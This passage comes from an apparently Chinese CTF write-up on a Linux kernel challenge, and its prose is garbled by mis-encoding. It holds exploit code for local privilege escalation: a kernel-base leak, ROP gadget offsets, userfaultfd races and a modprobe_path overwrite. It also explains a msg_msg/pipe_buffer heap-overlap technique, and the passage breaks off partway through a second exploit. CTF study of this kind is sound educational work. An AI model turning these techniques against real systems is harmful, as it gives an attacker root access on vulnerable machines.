class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> note_fd = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    read(note_fd, data, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;/sys/kernel/notes&quot;</span>, data, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x84</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x19e1180</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    magic_gadget += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;modprobe_path&quot;</span>, modprobe_path);</span><br><span class="line">    hexx(<span class="string">&quot;magic_gadget&quot;</span>, magic_gadget);</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line">    </span><br><span class="line">    work_for_cpu_fn  = kernel_base + <span class="number">0x8c360</span>;</span><br><span class="line">    init_creds = kernel_base + <span class="number">0x1448cc0</span>;</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">35</span>;</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;work_for_cpu_fn&quot;</span>, work_for_cpu_fn);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    pop_rdi = kernel_base + <span class="number">0xe031</span>;</span><br><span class="line">    add_rsp_188_pop_rbx_ret = kernel_base + <span class="number">0x9369cc</span>;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_188_pop_rbx_ret&quot;</span>,add_rsp_188_pop_rbx_ret);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    fake_ops_addr = heap_addr - <span class="number">0x68</span>;</span><br><span class="line">    hexx(<span class="string">&quot;fake_ops_addr&quot;</span>, fake_ops_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(tty_fd, <span class="number">0x68732f706d742f</span>, modprobe_path - <span class="number">8</span>);</span><br><span class="line">    ioctl(tty_fd, <span class="number">0x68732f</span>, modprobe_path - <span class="number">4</span>);</span><br><span class="line">    get_flag();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ±‚è§£æ•ˆæœ"><a href="#æ±‚è§£æ•ˆæœ" class="headerlink" title="æ±‚è§£æ•ˆæœ"></a>æ±‚è§£æ•ˆæœ</h3><img src="/2024/10/07/kno_puts/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="userfaultfd-msg-msg-pipe-buffer"><a href="#userfaultfd-msg-msg-pipe-buffer" class="headerlink" title="userfaultfd + msg_msg + pipe_buffer"></a>userfaultfd + msg_msg + pipe_buffer</h2><h3 id="æ€è·¯åˆ†æ-2"><a href="#æ€è·¯åˆ†æ-2" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h3><p>ç°åœ¨æˆ‘ä»¬åœ¨ä¸Šé¢çš„æƒ…å†µä¸­åŠ ç‚¹é™åˆ¶ï¼Œå³ <code>/sys/kernel/notes</code> é‡Œé¢ä¸å†ç»™æˆ‘ä»¬æä¾›å†…æ ¸åœ°å€ï¼Œé‚£æˆ‘ä»¬èƒ½å¦ç»§ç»­è·å–å†…æ ¸çš„åœ°å€å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œéœ€è¦ <code>msg_msg</code> å’Œ <code>pipe_buffer</code> ä¸¤ä¸ªç»“æ„ä½“æ¥ç›¸äº’åä½œï¼Œå› ä¸ºä»–ä»¬éƒ½å¯ä»¥è®©å †ç®¡ç†å™¨å–å‡º <code>0x400</code> å¤§å°çš„ <code>objcet</code>ã€‚å¯èƒ½æœ‰çš„å¸ˆå‚…ä¼šé—®æˆ‘è¿™é‡Œä¸ºä»€ä¹ˆä¸èƒ½ä½¿ç”¨ <code>tty_struct</code>ï¼Œè¿™é‡Œæˆ‘åé¢ä¼šè¿›è¡Œè§£é‡Šã€‚</p><p>é€šè¿‡è°ƒè¯•æˆ‘ä»¬å¯ä»¥å‘ç°å†…æ ¸å¹¶æ²¡æœ‰å¼€å¯ <code>CONFIG_SLAB_HARDENED=y</code> é€‰é¡¹ï¼Œå¯å°±æ˜¯è¯´æˆ‘ä»¬å †å—çš„å¸ƒå±€å¯é¢„æµ‹ã€‚å½“ç„¶å¦‚æœå¼€å¯äº†æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å †å–·æ¥è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœã€‚æˆ‘ä»¬å¯ä»¥ç›¸é‚»çš„å¸ƒå±€ä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“ å’Œä¸€ä¸ª <code>pipe_buffer</code> æ•°ç»„ï¼Œç„¶åé€šè¿‡ <code>uaf</code> æ¥å°† msg_msg.m_ts æ¥æ”¹å¤§ï¼ŒåŒæ—¶å°† msg_msgseg *next æŒ‡å‘ <code>msg_msg +0x300</code> çš„ä½ç½®ï¼ˆåé¢è§£é‡Šï¼‰ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥å®ç°ç»“æ„ä½“çš„è¶Šç•Œè¯»ã€‚åŒæ—¶ <code>msg_msg</code> ç»“æ„ä½“çš„ä¸‹æ–¹æœ‰ä¸ª <code>pipe_buffer</code> æ•°ç»„ï¼Œå¯ä»¥é€šè¿‡è¯¥ç»“æ„çš„ <code>ops</code> æ¥è·å–åˆ°å†…æ ¸çš„åœ°å€ã€‚æ­¤æ—¶çš„å †å¸ƒå±€å¦‚ä¸‹ï¼š</p><img src="/2024/10/07/kno_puts/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å½“æˆ‘ä»¬è°ƒç”¨ <code>msgrcv</code> æ¥è¯»å– <code>msg_msg</code> ä¸­çš„å†…å®¹æ—¶ï¼Œå†…æ ¸ä¼šè°ƒç”¨ <code>free_msg</code> éå† <code>next</code> ä¾æ¬¡é‡Šæ”¾ <code>msg_send</code> å¹¶æœ€ç»ˆé‡Šæ”¾ <code>msg_msg</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">security_msg_msg_free(msg);</span><br><span class="line"></span><br><span class="line">seg = msg-&gt;next;</span><br><span class="line">kfree(msg);</span><br><span class="line"><span class="keyword">while</span> (seg != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">tmp</span> =</span> seg-&gt;next;</span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line">kfree(seg);</span><br><span class="line">seg = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶éå†çš„ç»ˆæ­¢æ¡ä»¶ä¸º <code>next</code> æŒ‡é’ˆä¸ºç©ºã€‚ç”±äºæˆ‘ä»¬ <code>msg_msg</code> çš„ <code>next</code> æŒ‡é’ˆæŒ‡å‘ <code>msg_msg + 0x300</code> çš„ä½ç½®ï¼ˆæ³¨æ„ï¼Œè¿™ä¸ªä½ç½®å¿…é¡»ä¸ºç©ºï¼Œè¿™æ˜¯ä¸ºäº†ç»ˆæ­¢ <code>free_msg</code> å¯¹ <code>next</code> æŒ‡é’ˆçš„éå†ï¼‰ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬è¯»å– <code>msg_msg</code> çš„æ•°æ®æ³„éœ²å†…æ ¸åœ°å€å <code>msg_msg + 0x300</code> ä¼šè¢«å½“æˆä¸€ä¸ªå †å—è¿›è¡Œé‡Šæ”¾ï¼Œæœ€ç»ˆå †çš„å¸ƒå±€ä¼šå˜æˆä¸‹é¢è¿™ç§æƒ…å†µï¼š</p><img src="/2024/10/07/kno_puts/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§å‡ºç°äº†å å †ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å†æ¬¡ç”³è¯· <code>0x400</code> çš„ <code>object</code> å°±èƒ½ä¿®æ”¹åˆ°ä¸‹æ–¹çš„ <code>pipe_buffer</code>ã€‚æ¥ä¸‹æ¥å°±æ˜¯ä¸€æ¡é¾™æœåŠ¡äº†ï¼Œä¿®æ”¹ <code>ops</code> ç„¶åä¸¤æ¬¡æ ˆè¿ç§»æ‰“ <code>kernel rop</code>ã€‚è¿™é‡Œæˆ‘ä¸ºä»€ä¹ˆæ²¡ç”¨ <code>tty_struct</code> å‘¢ï¼Ÿå› ä¸ºå½“æˆ‘ä½¿ç”¨ <code>tty_struct</code> æ—¶ï¼Œæˆ‘å å †ä¿®æ”¹ <code>tty_struct</code> æ—¶å‰ <code>8</code> å­—èŠ‚å¿…é¡»ä¸ºç©ºï¼Œå¦åˆ™å°±ä¼š <code>kernel panice</code>ï¼Œå¯æ˜¯æ”¹ <code>pipe_buffer</code> æ—¶å‰ <code>8</code> å­—èŠ‚ç¡®å¯ä»¥æœ‰æ•°æ®ã€‚æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œ<code>tty_struct</code> å‰ <code>8</code> å­—èŠ‚æ˜¯é­”æœ¯å­— <code>0x100005401</code>ï¼Œå¦‚æœæ”¹å­—æ®µæŸå <code>tty_struct</code> å°±ä¸ä¼šæ‰§è¡Œä»–è™šè¡¨ä¸Šçš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ— æ³•æ§åˆ¶ç¨‹åºæµã€‚æ‰€ä»¥åˆ°åº•ä¸ºä»€ä¹ˆä¼š <code>panic</code>ğŸ˜‡ï¼Œå¦‚æœæœ‰å¸ˆå‚…çŸ¥é“åŸå› å¯ä»¥åŠ ç¬”è€…å¾®ä¿¡æˆ– QQ æ•™æ•™é¼ é¼ ğŸ˜­</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff824493c0</span>;</span><br><span class="line"><span class="type">size_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn = <span class="number">0xffffffff810bd960</span>;</span><br><span class="line"><span class="type">size_t</span> init_creds = <span class="number">0xffffffff82c6b920</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ce710</span>;</span><br><span class="line"><span class="type">size_t</span> orignal[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">size_t</span> leak, kernel_base;</span><br><span class="line"><span class="type">size_t</span> magic_gadget = <span class="number">0xffffffff81599a34</span>;</span><br><span class="line"><span class="comment">// 0xffffffff81599a34: push rsi; pop rsp; setl al; shl eax, 2; ret;</span></span><br><span class="line"><span class="type">size_t</span> add_rsp = <span class="number">0xffffffff81371a49</span>;</span><br><span class="line"><span class="comment">// 0xffffffff81371a49: add rsp, 8; pop rbx; pop r12; pop rbp; ret;</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> add_rsp_188_pop_rbx_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00a74</span>;</span><br><span class="line"><span class="type">size_t</span> ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> msg_qid;</span><br><span class="line"><span class="type">int</span> tty_fd;</span><br><span class="line"><span class="type">char</span> msg_buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> 